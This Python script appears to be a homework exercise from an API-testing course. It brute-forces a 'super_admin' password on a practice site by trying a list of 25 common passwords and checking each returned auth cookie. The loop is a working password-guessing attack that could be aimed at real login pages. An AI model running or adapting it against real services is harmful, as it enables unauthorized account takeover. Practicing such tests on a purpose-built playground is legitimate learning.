import requests

password_list = ["123456","123456789","qwerty","password","1234567","12345678","12345","iloveyou","111111","123123","abc123","qwerty123","1q2w3e4r","admin",
                 "qwertyuiop","654321","555555","lovely","7777777","welcome","888888","princess","dragon","password1","123qwe"]

for pwd in password_list:
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": "super_admin","password": pwd})

    # Если код ответа не равен 500, то получаем из ответа auth_cookie
    if response.status_code != 500:
        # Получаем значение auth_cookie
        cookie_value = response.cookies.get("auth_cookie")
        cookies = {}
        if cookie_value is not None:
            cookies.update({"auth_cookie": cookie_value})
            # Выполняем второй вызов
            response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
            if (response.text == "You are authorized"):
                print("The password is: '" + pwd + "'. Response is: " + response.text)
